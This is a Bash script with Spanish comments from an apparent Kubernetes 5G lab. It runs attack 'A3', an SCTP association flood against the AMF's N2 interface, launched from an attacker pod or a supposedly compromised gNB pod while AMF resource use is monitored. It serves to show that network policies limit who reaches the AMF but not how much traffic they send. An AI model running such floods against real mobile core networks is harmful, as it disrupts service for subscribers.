#!/bin/bash
# a3-flood-n2.sh — A3: inundación de asociaciones SCTP contra N2 del AMF.
#
# Muestra el límite de una política de red: decide QUIÉN puede hablar con el
# AMF, no CUÁNTO. Se lanza desde un pod al que la política permite N2.
#
#   ORIGEN=attacker   (por defecto) el pod attacker-ran. Con las políticas del
#                     lab no llega al AMF: Cilium (una red) o Kyverno y la
#                     MultiNetworkPolicy (redes dedicadas) lo impiden.
#   ORIGEN=gnb        el pod del gNB, como si estuviera comprometido. La política
#                     lo deja pasar porque es el origen legítimo de N2.
#                     Requiere python3 en la imagen del gNB: compruébalo antes
#                     con 'kubectl -n 5g-ran exec deploy/ueransim-gnb -- python3 -V'.
#
# Uso (desde node-master):
#   AMF_IP=10.10.0.10 ORIGEN=gnb bash attacks/a3-flood-n2.sh    # redes dedicadas
#   AMF_IP=$(kubectl -n 5g-cp get pod -l app.kubernetes.io/name=amf \
#            -o jsonpath='{.items[0].status.podIP}') bash attacks/a3-flood-n2.sh
set -uo pipefail
AMF_IP="${AMF_IP:?Define AMF_IP (10.10.0.10 con redes dedicadas; la IP del pod con una sola red)}"
ORIGEN="${ORIGEN:-attacker}"
CONEXIONES="${CONEXIONES:-1000 5000 10000}"
DIR="$(cd "$(dirname "$0")" && pwd)"

case "$ORIGEN" in
  attacker) NS=5g-ran; POD=attacker-ran ;;
  gnb) NS=5g-ran; POD=$(kubectl -n 5g-ran get pod -l app.kubernetes.io/name=ueransim-gnb -o jsonpath='{.items[0].metadata.name}') ;;
  *) echo "ORIGEN debe ser attacker o gnb"; exit 1 ;;
esac

echo "=== A3: flood N2 desde ${NS}/${POD} hacia ${AMF_IP}:38412 | $(date -u) ==="
kubectl cp "${DIR}/sctp_flood.py" "${NS}/${POD}:/tmp/sctp_flood.py"

echo "--- AMF antes ---"
kubectl top pod -n 5g-cp -l app.kubernetes.io/name=amf

for n in $CONEXIONES; do
  echo "--- ${n} asociaciones ---"
  kubectl -n "$NS" exec "$POD" -- python3 /tmp/sctp_flood.py "$AMF_IP" 38412 "$n" &
  pid=$!
  while kill -0 "$pid" 2>/dev/null; do
    kubectl top pod -n 5g-cp -l app.kubernetes.io/name=amf --no-headers
    sleep 5
  done
  wait "$pid"
done

echo "--- AMF después ---"
kubectl get pods -n 5g-cp -l app.kubernetes.io/name=amf
echo "Comprueba que el UE sigue registrado: kubectl -n 5g-ran logs deploy/ueransim-ues --tail=5"
